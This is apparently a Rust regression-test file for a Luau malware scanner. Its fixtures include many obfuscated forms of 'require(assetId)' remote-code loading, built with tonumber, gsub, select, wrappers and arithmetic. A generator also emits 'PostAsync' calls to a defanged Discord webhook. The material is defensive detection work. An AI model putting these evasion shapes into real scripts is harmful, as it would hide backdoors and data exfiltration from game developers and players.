//! Review round 2 regressions for the Luau analyzer: round 3 brief items 1 to 3, 5 to 8
//! and the first bullet of item 9. Every fixture is synthetic and defanged: asset IDs
//! are in 999000000000000 to 999999999999999 and webhook strings end in `000/FAKE`.

use bloxguard_core::analysis::{
    AnalysisResult, MAX_EXPRESSION_OPERATORS, MAX_INTERPOLATION_NESTING, MAX_LEXICAL_NESTING,
    analyze, lexical_summary, max_lexical_tokens, parser_budget,
};
use bloxguard_core::config::Config;
use bloxguard_core::engine;
use bloxguard_core::finding::{Confidence, Finding, Severity};
use bloxguard_core::model::{Completeness, Document, Instance, Limits};
use bloxguard_core::report::ScanReport;
use std::collections::BTreeMap;
use std::time::{Duration, Instant};

fn script_document(source: &str) -> Document {
    Document {
        input: "FAKE_round2.luau".into(),
        instances: vec![Instance {
            name: "FAKE_Script".into(),
            class: "Script".into(),
            source: Some(source.into()),
            ..Instance::default()
        }],
        ..Document::default()
    }
}

fn analysis(source: &str) -> AnalysisResult {
    analyze(&script_document(source), 0, &Limits::default(), &[])
}

fn scan(document: Document) -> ScanReport {
    engine::scan_documents(vec![document], &Config::default())
}

fn describe(findings: &[Finding]) -> Vec<String> {
    findings
        .iter()
        .map(|finding| {
            format!(
                "{} {} {:?} {} | {}",
                finding.rule_id,
                finding.severity,
                finding.confidence,
                finding.message,
                finding.evidence
            )
        })
        .collect()
}

fn nest(open: &str, middle: &str, close: &str, count: usize) -> String {
    let mut source = String::with_capacity((open.len() + close.len()) * count + middle.len());
    for _ in 0..count {
        source.push_str(open);
    }
    source.push_str(middle);
    for _ in 0..count {
        source.push_str(close);
    }
    source
}

fn chain(head: &str, link: &str, count: usize, tail: &str) -> String {
    let mut source = String::with_capacity(head.len() + link.len() * count + tail.len());
    source.push_str(head);
    for _ in 0..count {
        source.push_str(link);
    }
    source.push_str(tail);
    source
}

// ----- item 1: lexical budget ----------------------------------------------------------

fn data_table(rows: usize) -> String {
    let mut source = String::from("return {\n");
    for row in 0..rows {
        source.push_str(&format!(
            "\t{{ id = {}, name = \"FAKE_Item_{row:05}\", price = {}, weight = 1.5, tags = {{\"FAKE\", \"common\"}} }},\n",
            999_000_000_000_000u64 + row as u64,
            row % 500
        ));
    }
    source.push_str("}\n");
    source
}

#[test]
fn item1_data_table_token_count_is_far_below_the_size_derived_cap() {
    let source = data_table(12_000);
    assert!(source.len() > 700_000, "{} bytes", source.len());
    let summary = lexical_summary(&source, &Limits::default()).expect("budget");
    assert!(summary.tokens > 100_000, "{} tokens", summary.tokens);
    assert!(summary.tokens < max_lexical_tokens(&Limits::default()) / 2);
}

fn token_kinds() -> Vec<&'static str> {
    vec![
        "and",
        "break",
        "do",
        "else",
        "elseif",
        "end",
        "false",
        "for",
        "function",
        "if",
        "in",
        "local",
        "nil",
        "not",
        "or",
        "repeat",
        "return",
        "then",
        "true",
        "until",
        "while",
        "continue",
        "export",
        "type",
        "typeof",
        "+=",
        "-=",
        "*=",
        "/=",
        "//=",
        "%=",
        "^=",
        "..=",
        "&",
        "->",
        "::",
        "@",
        "^",
        ":",
        ",",
        ".",
        "..",
        "...",
        "=",
        "==",
        ">",
        ">=",
        "#",
        "{",
        "[",
        "(",
        "<",
        "<=",
        "-",
        "%",
        "|",
        "+",
        "?",
        "}",
        "]",
        ")",
        ";",
        "/",
        "//",
        "*",
        "~=",
        "FAKE_name",
        "_",
        "1",
        "0x1F",
        "1e5",
        "1_000",
        "\"FAKE\"",
        "'FAKE'",
        "[[FAKE]]",
        "`FAKE`",
        "`{",
        "}`",
        "`{1}`",
        "--FAKE\n",
        "--[[FAKE]]",
        "\n",
        "\\",
        "$",
        "!",
        "~",
    ]
}

fn token_shapes(kind: &str, count: usize) -> Vec<String> {
    let repeated = chain("", &format!("{kind} "), count, "");
    vec![
        repeated.clone(),
        format!("return {repeated} FAKE_x"),
        format!("local FAKE_v = {repeated} 1"),
        format!("FAKE_f({repeated})"),
    ]
}

#[test]
fn item1_every_token_kind_repeated_50000_times_returns_a_report() {
    let cases: Vec<(String, String)> = token_kinds()
        .into_iter()
        .flat_map(|kind| {
            token_shapes(kind, 50_000)
                .into_iter()
                .enumerate()
                .map(move |(shape, source)| (format!("{kind:?} shape {shape}"), source))
        })
        .collect();
    let failures = std::sync::Mutex::new(Vec::new());
    let next = std::sync::atomic::AtomicUsize::new(0);
    std::thread::scope(|scope| {
        for _ in 0..8 {
            scope.spawn(|| {
                loop {
                    let index = next.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                    let Some((label, source)) = cases.get(index) else {
                        break;
                    };
                    let started = Instant::now();
                    let report = scan(script_document(source));
                    let elapsed = started.elapsed();
                    let input = &report.inputs[0];
                    let explained =
                        input.completeness == Completeness::Complete || !input.reasons.is_empty();
                    if !explained || elapsed > Duration::from_secs(15) {
                        failures.lock().unwrap().push(format!(
                            "{label}: {:?} in {elapsed:?} with {:?}",
                            input.completeness, input.reasons
                        ));
                    }
                }
            });
        }
    });
    let failures = failures.into_inner().unwrap();
    assert!(failures.is_empty(), "{failures:#?}");
}

/// Shapes that nest one construct `depth` times.
fn deep_shapes(depth: usize) -> Vec<(&'static str, String)> {
    vec![
        (
            "parentheses",
            format!("return {}", nest("(", "1", ")", depth)),
        ),
        (
            "brackets",
            format!("return {}", nest("FAKE_t[", "1", "]", depth)),
        ),
        ("braces", format!("return {}", nest("{", "1", "}", depth))),
        (
            "calls",
            format!("return {}", nest("FAKE_f(", "1", ")", depth)),
        ),
        (
            "function bodies",
            format!("return {}", nest("function() return ", "1", " end", depth)),
        ),
        ("do blocks", nest("do ", "local FAKE_x = 1", " end", depth)),
        (
            "if statements",
            nest("if FAKE_c then ", "local FAKE_x = 1", " end", depth),
        ),
        (
            "while loops",
            nest("while FAKE_c do ", "local FAKE_x = 1", " end", depth),
        ),
        (
            "numeric for loops",
            nest("for FAKE_i = 1, 2 do ", "local FAKE_x = 1", " end", depth),
        ),
        (
            "repeat loops",
            nest("repeat ", "local FAKE_x = 1", " until FAKE_c", depth),
        ),
        (
            "local functions",
            nest(
                "local function FAKE_f() ",
                "local FAKE_x = 1",
                " end",
                depth,
            ),
        ),
        ("unary minus", chain("return ", "- ", depth, "1")),
        ("unary not", chain("return ", "not ", depth, "FAKE_c")),
        ("unary length", chain("return ", "#", depth, "FAKE_t")),
        (
            "concatenation",
            chain("return FAKE_a", " .. FAKE_a", depth, ""),
        ),
        ("power", chain("return 2", " ^ 2", depth, "")),
        ("addition", chain("return 1", " + 1", depth, "")),
        ("comparison", chain("return 1", " < 1", depth, "")),
        (
            "if expressions",
            chain("return ", "if FAKE_c then 1 else ", depth, "2"),
        ),
        (
            "casts",
            format!("return {}", nest("(", "FAKE_x", " :: any)", depth)),
        ),
        (
            "generic types",
            format!(
                "type FAKE_T = {}",
                nest("FAKE_Box<", "number", ">", depth / 2)
            ),
        ),
        (
            "table types",
            format!(
                "type FAKE_T = {}",
                nest("{ FAKE_a: ", "number", " }", depth)
            ),
        ),
        (
            "union types",
            chain("type FAKE_T = \"FAKE\"", " | \"FAKE\"", depth, ""),
        ),
        (
            "function types",
            chain("type FAKE_F = ", "() -> ", depth, "()"),
        ),
        (
            "interpolated strings",
            format!(
                "return {}",
                nest(
                    "`{",
                    "1",
                    "}`",
                    if depth > MAX_LEXICAL_NESTING {
                        depth
                    } else {
                        MAX_INTERPOLATION_NESTING - 1
                    }
                )
            ),
        ),
        (
            "brackets around a chain",
            format!(
                "return {}",
                nest(
                    "(",
                    &chain("FAKE_a", " .. FAKE_a", depth / 2, ""),
                    ")",
                    depth / 2
                )
            ),
        ),
    ]
}

#[test]
fn item1_lexical_caps_reject_each_construct_above_the_cap() {
    // Concatenation has its own, higher cap since round 4.
    let above = MAX_LEXICAL_NESTING
        .max(MAX_EXPRESSION_OPERATORS)
        .max(bloxguard_core::analysis::MAX_CONCAT_OPERATORS)
        + 8;
    for (label, source) in deep_shapes(above * 2) {
        let result = analysis(&source);
        assert!(
            result.findings.is_empty() && !result.reasons.is_empty(),
            "{label}: {:?} {:?}",
            result.reasons,
            describe(&result.findings)
        );
    }
}

#[test]
fn item1_mismatched_closers_cannot_lower_the_count() {
    // Each level opens frames and then closes with a token that matches an outer frame.
    // The budget must never let such input reach a deep parse.
    for (label, level) in [
        ("end inside call", "function() FAKE_f(if FAKE_c then end "),
        ("paren after block", "do FAKE_f(function() ) "),
        ("bracket in table", "{ FAKE_t[ } "),
        ("until in parens", "repeat ( until FAKE_c "),
        ("interpolation end", "`{ ( }` "),
    ] {
        for depth in [2_000, 20_000] {
            let source = format!("{}{}", level.repeat(depth), "(".repeat(800));
            let started = Instant::now();
            let result = analysis(&source);
            assert!(!result.reasons.is_empty(), "{label} at {depth}");
            assert!(
                started.elapsed() < Duration::from_secs(20),
                "{label} at {depth}"
            );
        }
    }
}

#[test]
fn item1_elseif_conditions_with_if_expressions_do_not_leak_frames() {
    let source = format!(
        "if FAKE_a then\n{}\nend\n{}",
        lines(2_000, |_| {
            "elseif if FAKE_c then FAKE_x else FAKE_y then print(1)".into()
        }),
        lines(500, |index| format!("local FAKE_v{index} = (({index}))"))
    );
    let result = analysis(&source);
    expect_complete("elseif chain", &result);
}

// ----- item 2: unary chains ------------------------------------------------------------

fn unary_chains(count: usize) -> Vec<(&'static str, String)> {
    vec![
        ("length", chain("return ", "#", count, "FAKE_t")),
        ("minus", chain("return ", "- ", count, "1")),
        ("not", chain("return ", "not ", count, "FAKE_c")),
        ("mixed", chain("return ", "-#not ", count / 3, "FAKE_t")),
        ("after binary", chain("return 1 + ", "- ", count, "1")),
        (
            "index key",
            format!("return FAKE_t[{}]", chain("", "#", count, "FAKE_t")),
        ),
        (
            "table field",
            format!("return {{ FAKE_x = {} }}", chain("", "not ", count, "1")),
        ),
        (
            "call argument",
            format!("FAKE_f({})", chain("", "- ", count, "1")),
        ),
        (
            "after function",
            chain("return function() end .. ", "#", count, "FAKE_t"),
        ),
    ]
}

#[test]
fn item2_unary_chains_are_partial_with_a_reason() {
    for (label, source) in unary_chains(20_000) {
        let started = Instant::now();
        let result = analysis(&source);
        assert!(
            result
                .reasons
                .iter()
                .any(|reason| reason.contains("expression complexity")),
            "{label}: {:?}",
            result.reasons
        );
        let report = scan(script_document(&source));
        assert_eq!(report.completeness, Completeness::Partial, "{label}");
        assert!(!report.inputs[0].reasons.is_empty(), "{label}");
        assert!(started.elapsed() < Duration::from_secs(10), "{label}");
    }
}

#[test]
fn item2_statement_resets_cannot_hide_a_nested_chain() {
    // Function bodies and statements inside an expression restart from the enclosing
    // count, so they cannot reset a chain that the parser nests. Each concatenation
    // link adds two `..`, so the links pass the separate concatenation cap of round 4.
    let links = bloxguard_core::analysis::MAX_CONCAT_OPERATORS / 2 + 100;
    for source in [
        chain(
            "local FAKE_x = FAKE_a",
            " .. function() local FAKE_y = 1 end .. FAKE_a",
            links,
            "",
        ),
        chain(
            "local FAKE_x = ",
            "FAKE_a .. (function() return 1 end)() .. ",
            links,
            "FAKE_a",
        ),
        chain("return ", "if FAKE_c then 1 else ", 2_000, "2"),
    ] {
        let result = analysis(&source);
        assert!(
            result
                .reasons
                .iter()
                .any(|reason| reason.contains("parser safety cap")),
            "{:?}",
            result.reasons
        );
    }
}

// ----- item 1: ordinary files after the evaluator rewrite ------------------------------

fn find<'a>(
    findings: &'a [Finding],
    rule: &str,
    severity: Severity,
    confidence: Option<Confidence>,
) -> Option<&'a Finding> {
    findings.iter().find(|finding| {
        finding.rule_id == rule
            && finding.severity >= severity
            && confidence.is_none_or(|confidence| finding.confidence == confidence)
    })
}

#[track_caller]
fn expect_no_high(label: &str, result: &AnalysisResult) {
    let high: Vec<_> = result
        .findings
        .iter()
        .filter(|finding| finding.severity >= Severity::High)
        .cloned()
        .collect();
    assert!(
        high.is_empty(),
        "{label}: unexpected high or critical findings: {:#?}",
        describe(&high)
    );
}

#[track_caller]
fn expect_complete(label: &str, result: &AnalysisResult) {
    assert!(
        result.reasons.is_empty(),
        "{label}: analysis was incomplete: {:?}",
        result.reasons
    );
}

fn lines(count: usize, line: impl Fn(usize) -> String) -> String {
    (0..count).map(line).collect::<Vec<_>>().join("\n")
}

fn ordinary_shapes() -> Vec<(&'static str, String)> {
    vec![
        (
            "130 print concatenations",
            lines(130, |index| {
                format!(
                    "local FAKE_name{index} = \"FAKE\"\nprint(\"FAKE line \" .. FAKE_name{index})"
                )
            }),
        ),
        (
            "159 comparisons",
            lines(159, |index| {
                format!(
                    "if FAKE_a < {index} then FAKE_count = FAKE_count + 1 end\nlocal FAKE_ok{index} = FAKE_b > {index}"
                )
            }),
        ),
        (
            "159 if-expressions",
            lines(159, |index| {
                format!("local FAKE_v{index} = if FAKE_c then {index} else -{index}")
            }),
        ),
        ("12,000-row data table", data_table(12_000)),
        (
            "long condition",
            format!(
                "if {} then print(\"FAKE\") end",
                (0..300)
                    .map(|index| format!("FAKE_flag{index}"))
                    .collect::<Vec<_>>()
                    .join(" and ")
            ),
        ),
        (
            "long string concatenation",
            format!(
                "local FAKE_message = {}\nprint(FAKE_message)",
                (0..400)
                    .map(|index| format!("\"part{index}\""))
                    .collect::<Vec<_>>()
                    .join(" .. ")
            ),
        ),
        (
            "builder method chain",
            chain(
                "local FAKE_b = FAKE_Builder.new()",
                ":with(\"FAKE\", 1)",
                600,
                ":build()",
            ),
        ),
        (
            "nested configuration tables",
            format!("return {}", nest("{ FAKE_child = ", "true", " }", 40)),
        ),
        (
            "many functions with branches",
            lines(2_000, |index| {
                format!(
                    "local function FAKE_handler{index}(kind)\n\tif kind == 1 then return {index} elseif kind == 2 then return -{index} else return nil end\nend"
                )
            }),
        ),
        (
            "typed generic code",
            lines(200, |index| {
                format!(
                    "--!strict\ntype FAKE_Map{index}<K, V> = {{ [K]: V }}\nlocal function FAKE_get{index}<K, V>(map: FAKE_Map{index}<K, V>, key: K): V? return map[key] end"
                )
            }),
        ),
        (
            "nested element tree",
            format!(
                "local e = FAKE_React.createElement\nreturn {}",
                nest(
                    "e(\"Frame\", { Size = FAKE_UDim2.new(1, 0, 1, 0) }, { FAKE_Child = ",
                    "e(\"TextLabel\", { Text = \"FAKE\" })",
                    " })",
                    60
                )
            ),
        ),
    ]
}

#[test]
fn item1_ordinary_shapes_stay_complete() {
    for (label, source) in ordinary_shapes() {
        let summary = lexical_summary(&source, &Limits::default())
            .unwrap_or_else(|reason| panic!("{label}: lexical budget rejected it: {reason}"));
        assert!(summary.tokens > 0, "{label}");
        parser_budget(&source, &Limits::default())
            .unwrap_or_else(|reason| panic!("{label}: {reason}"));
        let started = Instant::now();
        let result = analysis(&source);
        expect_complete(label, &result);
        expect_no_high(label, &result);
        assert!(
            started.elapsed() < Duration::from_secs(20),
            "{label} took {:?}",
            started.elapsed()
        );
    }
}

#[test]
fn item1_small_ordinary_shapes_are_complete_through_the_engine() {
    for (label, source) in ordinary_shapes() {
        if source.len() > 200_000 {
            continue;
        }
        let report = scan(script_document(&source));
        assert_eq!(
            report.completeness,
            Completeness::Complete,
            "{label}: {:?}",
            report.inputs
        );
        assert!(
            report
                .findings
                .iter()
                .all(|finding| finding.severity < Severity::High),
            "{label}: {:#?}",
            describe(&report.findings)
        );
    }
}

#[test]
fn item1_lexical_caps_leave_parser_stack_headroom() {
    let below = MAX_LEXICAL_NESTING.min(MAX_EXPRESSION_OPERATORS) - 8;
    for (label, source) in deep_shapes(below) {
        let started = Instant::now();
        let result = analysis(&source);
        assert!(
            !result
                .reasons
                .iter()
                .any(|reason| reason.contains("parser safety cap")),
            "{label} below the cap was rejected: {:?}",
            result.reasons
        );
        assert!(
            started.elapsed() < Duration::from_secs(20),
            "{label} took {:?}",
            started.elapsed()
        );
    }
}

// ----- item 3: call chains -------------------------------------------------------------

#[test]
fn item3_long_call_chains_finish_quickly() {
    for (label, source) in [
        ("anonymous calls", chain("FAKE_f", "()", 50_000, "")),
        ("method calls", chain("FAKE_x", ":m()", 50_000, "")),
        (
            "mixed suffixes",
            chain("FAKE_x", ":m().FAKE_y[1](\"FAKE\")", 12_500, ""),
        ),
        (
            "field chain",
            chain("local FAKE_v = FAKE_a", ".b", 50_000, ""),
        ),
        ("string calls", chain("FAKE_f", " \"FAKE\"", 50_000, "")),
    ] {
        let started = Instant::now();
        let result = analysis(&source);
        let elapsed = started.elapsed();
        // The brief asks for under 2 s on this PC in release builds. Debug test builds
        // are several times slower, so this bound only catches super-linear work.
        assert!(
            elapsed < Duration::from_secs(10),
            "{label} took {elapsed:?}"
        );
        expect_no_high(label, &result);
    }
}

#[test]
fn item3_a_sink_at_the_start_of_a_long_chain_is_still_reported() {
    let source = chain("require(999000000000301)", "()", 50_000, "");
    let started = Instant::now();
    let result = analysis(&source);
    assert!(started.elapsed() < Duration::from_secs(10));
    assert!(
        find(
            &result.findings,
            "BG001",
            Severity::High,
            Some(Confidence::High)
        )
        .is_some()
    );
    let finding = find(&result.findings, "BG001", Severity::High, None).unwrap();
    assert!(
        finding.evidence.starts_with("require(999000000000301)"),
        "{}",
        finding.evidence
    );
    assert_eq!(finding.location.end_column, Some(25));
}

#[test]
fn item3_escapes_in_every_link_stay_bounded() {
    let source = chain("FAKE_f", "(require)", 20_000, "");
    let started = Instant::now();
    let result = analysis(&source);
    assert!(started.elapsed() < Duration::from_secs(10));
    assert_eq!(result.findings.len(), 256);
    assert!(
        result
            .reasons
            .iter()
            .any(|reason| reason.contains("finding output limit"))
    );
}

#[test]
fn item3_large_values_and_replays_stay_bounded() {
    for (label, source, partial) in [
        (
            "large string used many times",
            format!(
                "local FAKE_s = (\"x\"):rep(1000000)\n{}",
                lines(60_000, |_| "FAKE_f(FAKE_s)".into())
            ),
            false,
        ),
        (
            "many large folded strings",
            lines(200, |index| {
                format!("local FAKE_s{index} = (\"x\"):rep(2000000)")
            }),
            true,
        ),
        (
            "many replays of a large wrapper",
            format!(
                "local function FAKE_load(id)\n{}\nreturn require(id)\nend\n{}",
                lines(2_000, |index| format!("local FAKE_v{index} = {index}")),
                lines(200, |index| format!(
                    "FAKE_load({})",
                    999_000_000_000_700u64 + index as u64
                ))
            ),
            false,
        ),
        (
            "chain of wrappers",
            format!(
                "local function FAKE_w0(id) return require(id) end\n{}\nFAKE_w40(999000000000799)",
                lines(40, |index| format!(
                    "local function FAKE_w{}(id) return FAKE_w{index}(id) end",
                    index + 1
                ))
            ),
            false,
        ),
    ] {
        let started = Instant::now();
        let result = analysis(&source);
        let elapsed = started.elapsed();
        assert!(
            elapsed < Duration::from_secs(20),
            "{label} took {elapsed:?}"
        );
        if partial {
            assert!(
                result
                    .reasons
                    .iter()
                    .any(|reason| reason.contains("constant folding output limit")),
                "{label}: {:?}",
                result.reasons
            );
        } else {
            expect_complete(label, &result);
        }
    }
}

/// Library folds with extreme and malformed arguments must never panic (debug builds
/// trap integer overflow) and must stay fast.
#[test]
fn item3_folding_extremes_never_panic() {
    let numbers = [
        "0",
        "1",
        "-1",
        "2",
        "255",
        "256",
        "1.5",
        "2147483648",
        "-2147483649",
        "9007199254740993",
        "-9223372036854775808",
        "9223372036854775807",
        "1e308",
        "-1e308",
        "(0/0)",
        "(1/0)",
        "(-1/0)",
        "4294967295",
        "4294967296",
    ];
    let strings = [
        "",
        "abc",
        "  \\u{3000}\\u{3000} x",
        "\\u{e4}\\u{20ac}\\u{1d11e}",
        "999000000000001",
        "rbxassetid://999000000000002",
        "%",
        "a-b-c",
    ];
    let patterns = [
        "%",
        "[",
        "[^",
        "%b",
        "%b(",
        "%f",
        "%f[",
        "(",
        ")",
        "%1",
        "%0",
        "()",
        "[]]",
        "[a-]",
        "[%a-z]",
        "^",
        "$",
        "^$",
        ".-.-.-.-.-.-$",
        "a*a*a*a*a*a*b",
        "%d+",
        "(%d+)%1",
        "%z",
        "((((((((((((((((((((((((((((((((((a))))))))))))))))))))))))))))))))))",
    ];
    let templates: Vec<String> = numbers
        .iter()
        .flat_map(|a| numbers.iter().map(move |b| (*a, *b)))
        .flat_map(|(a, b)| {
            vec![
                format!("require(string.byte(\"abc\", {a}, {b}))"),
                format!("require(table.unpack({{1, 2, 3}}, {a}, {b}))"),
                format!("require(bit32.extract({a}, {b}, {a}))"),
                format!("require(bit32.lshift({a}, {b}) + bit32.arshift({b}, {a}))"),
                format!("require(math.clamp({a}, {b}, {a}))"),
                format!("require(math.fmod({a}, {b}) + math.max({a}, {b}))"),
                format!("require((\"abcdef\"):sub({a}, {b}))"),
                format!("require(select({a}, 1, 2, 3))"),
                format!("require(tonumber(\"z9\", {a}))"),
                format!("require(utf8.char({a}, {b}))"),
                format!("require(string.char({a}))"),
                format!("require((\"ab\"):rep({b}, \"-\"))"),
                format!("require(string.format(\"%5d%x%c%.3f%-9s\", {a}, {b}, {a}, {b}, {a}))"),
                format!("require({a} // {b} + {a} % {b} + {a} ^ {b})"),
            ]
        })
        .chain(strings.iter().flat_map(|text| {
            patterns.iter().flat_map(move |pattern| {
                vec![
                    format!("require((\"{text}\"):gsub(\"{pattern}\", \"%0%%\"))"),
                    format!("require((\"{text}\"):match(\"{pattern}\", -100))"),
                    format!("require((\"{text}\"):find(\"{pattern}\", 3, false))"),
                    format!("require(string.split(\"{text}\", \"{pattern}\")[1])"),
                    format!("require(tonumber(\"{text}\"))"),
                ]
            })
        }))
        .collect();
    let started = Instant::now();
    let mut panics = Vec::new();
    for source in &templates {
        // A panic in the worker thread is reported as an incomplete reason.
        let result = analysis(source);
        if result
            .reasons
            .iter()
            .any(|reason| reason.contains("panicked"))
        {
            panics.push(source.clone());
        }
    }
    assert!(panics.is_empty(), "{panics:#?}");
    assert!(
        started.elapsed() < Duration::from_secs(60),
        "{} cases took {:?}",
        templates.len(),
        started.elapsed()
    );
}

/// Deterministic generator of random programs over the evaluator's statement and
/// expression forms. Every program must produce a result without a worker panic.
struct ProgramGenerator {
    state: u64,
}

impl ProgramGenerator {
    fn next(&mut self, bound: usize) -> usize {
        self.state = self
            .state
            .wrapping_mul(6_364_136_223_846_793_005)
            .wrapping_add(1_442_695_040_888_963_407);
        ((self.state >> 33) % bound as u64) as usize
    }

    fn pick<'a>(&mut self, options: &[&'a str]) -> &'a str {
        options[self.next(options.len())]
    }

    fn expression(&mut self, depth: usize) -> String {
        let leaf = depth == 0 || self.next(3) == 0;
        if leaf {
            return match self.next(4) {
                0 => self
                    .pick(&["0", "-1", "999000000000001", "1e308", "(0/0)", "255", "2.5"])
                    .to_string(),
                1 => self
                    .pick(&[
                        "\"\"",
                        "\"require\"",
                        "\"999000000000002\"",
                        "\"https://discord.com/api/webhooks/000/FAKE\"",
                        "\"%d+\"",
                        "\"a,b\"",
                    ])
                    .to_string(),
                2 => self
                    .pick(&["v0", "v1", "v2", "f0", "f1", "...", "nil", "true"])
                    .to_string(),
                _ => self
                    .pick(&[
                        "game.PlaceId",
                        "script.Parent",
                        "workspace.FAKE.Value",
                        "_G",
                        "player.Name",
                    ])
                    .to_string(),
            };
        }
        let a = self.expression(depth - 1);
        let b = self.expression(depth - 1);
        match self.next(16) {
            0 => format!("{{{a}, {b}}}"),
            1 => format!("{{k = {a}, [{b}] = {a}}}"),
            2 => format!(
                "({a} {} {b})",
                self.pick(&[
                    "+", "-", "*", "/", "//", "%", "^", "..", "==", "<", "and", "or"
                ])
            ),
            3 => format!("{}{a}", self.pick(&["-", "#", "not "])),
            4 => {
                let function = self.pick(&[
                    "require",
                    "tonumber",
                    "tostring",
                    "select",
                    "string.rep",
                    "string.sub",
                    "string.byte",
                    "string.char",
                    "string.format",
                    "string.gsub",
                    "string.match",
                    "string.find",
                    "string.split",
                    "table.concat",
                    "table.unpack",
                    "table.pack",
                    "setmetatable",
                    "math.floor",
                    "bit32.bxor",
                    "utf8.char",
                    "rawget",
                    "getfenv",
                    "pcall",
                    "task.spawn",
                    "coroutine.wrap",
                    "f0",
                    "f1",
                    "v0",
                ]);
                format!("{function}({a}, {b})")
            }
            5 => format!("_G[{a}]"),
            6 => format!("v0[{a}]"),
            7 => format!("(function(p, ...) return {a}, ... end)"),
            8 => format!("(if {a} then {b} else {a})"),
            9 => format!("({a} :: any)"),
            10 => format!("`{{{a}}}x{{{b}}}`"),
            11 => format!(
                "({a}):{}({b})",
                self.pick(&["sub", "rep", "gsub", "match", "split", "byte", "FAKE"])
            ),
            12 => format!(
                "setmetatable({{}}, {{__index = {a}, __call = function(_, x) return {b} end}})"
            ),
            13 => format!("({a})({b})"),
            14 => format!("({a}).k"),
            _ => format!("game:GetService(\"HttpService\"):JSONEncode({{d = {a}}})"),
        }
    }

    fn statement(&mut self, depth: usize) -> String {
        let a = self.expression(3);
        let b = self.expression(2);
        let variable = self.pick(&["v0", "v1", "v2"]);
        if depth == 0 {
            return format!("{variable} = {a}");
        }
        let inner = self.statement(depth - 1);
        match self.next(13) {
            0 => format!("local {variable} = {a}"),
            1 => format!("{variable} = {a}"),
            2 => format!("{variable}.k = {a}"),
            3 => format!("{variable}[{b}] = {a}"),
            4 => format!("if {b} then {inner} end"),
            5 => format!("for i = 1, 3 do {inner} end"),
            6 => format!("for k, v in pairs({variable}) do {inner} end"),
            7 => format!("while false do {inner} end"),
            8 => format!(
                "local function {}(a, b, ...) {inner} return {a} end",
                self.pick(&["f0", "f1"])
            ),
            9 => format!("{}({a}, {b})", self.pick(&["f0", "f1"])),
            10 => format!("{variable} ..= {b}"),
            11 => format!("require({a})"),
            _ => format!("game:GetService(\"HttpService\"):PostAsync({a}, {b})"),
        }
    }
}

#[test]
fn item3_random_programs_never_panic() {
    let mut generator = ProgramGenerator {
        state: 0x5eed_b10c_6a2d,
    };
    let started = Instant::now();
    let mut panics = Vec::new();
    let mut parsed = 0;
    for _ in 0..1_500 {
        let program = (0..12)
            .map(|_| generator.statement(2))
            .collect::<Vec<_>>()
            .join("\n");
        let result = analysis(&program);
        if result
            .reasons
            .iter()
            .any(|reason| reason.contains("panicked"))
        {
            panics.push(program);
        } else if !result
            .reasons
            .iter()
            .any(|reason| reason.contains("could not parse"))
        {
            parsed += 1;
        }
    }
    assert!(panics.is_empty(), "{:#?}", &panics[..panics.len().min(3)]);
    // The generator must mostly produce programs that reach the evaluator.
    assert!(parsed > 1_000, "only {parsed} of 1500 programs parsed");
    assert!(
        started.elapsed() < Duration::from_secs(120),
        "{:?}",
        started.elapsed()
    );
}

// ----- item 5: require targets that contain an ID --------------------------------------

#[track_caller]
fn expect(
    label: &str,
    source: &str,
    rule: &str,
    severity: Severity,
    confidence: Option<Confidence>,
) {
    let result = analysis(source);
    assert!(
        find(&result.findings, rule, severity, confidence).is_some(),
        "{label}: expected {rule} at {severity} or above ({confidence:?})\nsource: {source}\nfindings: {:#?}\nreasons: {:?}",
        describe(&result.findings),
        result.reasons
    );
}

#[test]
fn item5_brief_shapes_resolve_to_high_findings() {
    for (label, source) in [
        ("select", "require(select(2, nil, 999000000000501))"),
        (
            "varargs wrapper",
            "local function FAKE_load(...) return require(...) end\nFAKE_load(999000000000502)",
        ),
        (
            "varargs immediately invoked",
            "(function(...) return require(...) end)(999000000000503)",
        ),
        ("math.floor", "require(math.floor(999000000000504 + 0.2))"),
        ("string arithmetic", "require(\"999000000000505\" + 0)"),
        (
            "constant table index",
            "local FAKE_ids = {999000000000506, 999000000000507}\nrequire(FAKE_ids[1])",
        ),
        ("hex string", "require(tonumber(\"0x38C95D0217003\"))"),
        ("power", "require(999000000000508 ^ 1)"),
        ("modulo", "require(1999000000000509 % 1000000000000000)"),
        ("floor division", "require(1998000000001020 // 2)"),
        (
            "string.byte offset",
            "require(string.byte(\"A\") + 999000000000511 - 65)",
        ),
        ("cast", "require((999000000000512 :: number))"),
        ("or default", "require(_G.FAKE_override or 999000000000513)"),
        (
            "if-expression",
            "require(if FAKE_flag then 999000000000514 else 999000000000515)",
        ),
    ] {
        expect(label, source, "BG001", Severity::High, None);
    }
}

#[test]
fn item5_folded_shapes_have_high_confidence() {
    for (label, source) in [
        (
            "concat then tonumber",
            "require(tonumber(\"999\" .. \"000000000520\"))",
        ),
        (
            "padded tonumber",
            "require(tonumber(\"  999000000000521  \"))",
        ),
        (
            "binary tonumber",
            "require(tonumber(\"11100011001001010111010000001000010111000000010000\", 2))",
        ),
        ("math.max", "require(math.max(1, 999000000000522))"),
        ("inline table", "require(({999000000000523})[1])"),
        ("unpack", "require(table.unpack({999000000000524}))"),
        (
            "utf8 digits",
            "require(utf8.char(57, 57, 57) .. \"000000000525\")",
        ),
        (
            "field assignment",
            "local FAKE_t = {}\nFAKE_t.id = 999000000000526\nrequire(FAKE_t.id)",
        ),
        (
            "straight-line compound",
            "local FAKE_id = 999000000000000\nFAKE_id += 527\nrequire(FAKE_id)",
        ),
        (
            "format integer",
            "require(tonumber(string.format(\"%d%d\", 999000, 528)))",
        ),
        (
            "gsub digits",
            "require(tonumber((\"9-9-9-0-0-0-0-0-0-0-0-0-5-2-9\"):gsub(\"-\", \"\")))",
        ),
        (
            "match digits",
            "require(tonumber((\"rbxassetid://999000000000530\"):match(\"%d+\")))",
        ),
        (
            "split then index",
            "require(tonumber(string.split(\"FAKE,999000000000531\", \",\")[2]))",
        ),
        (
            "numeric for over constant",
            "for _, FAKE_id in ipairs({999000000000532}) do require(FAKE_id) end",
        ),
    ] {
        expect(
            label,
            source,
            "BG001",
            Severity::High,
            Some(Confidence::High),
        );
    }
}

#[test]
fn item5_unresolved_targets_with_an_id_literal_are_high_with_medium_confidence() {
    for (label, source) in [
        ("unknown decoder", "require(FAKE_decode(999000000000540))"),
        ("unknown table", "require(FAKE_t[999000000000541])"),
        (
            "unknown method",
            "require((\"999000000000542\"):FAKE_transform())",
        ),
        (
            "unknown digits string",
            "require(FAKE_lookup(\"id-9990000000005\"))",
        ),
        (
            "local from unknown call",
            "local FAKE_m = FAKE_decode(999000000000543)\nrequire(FAKE_m)",
        ),
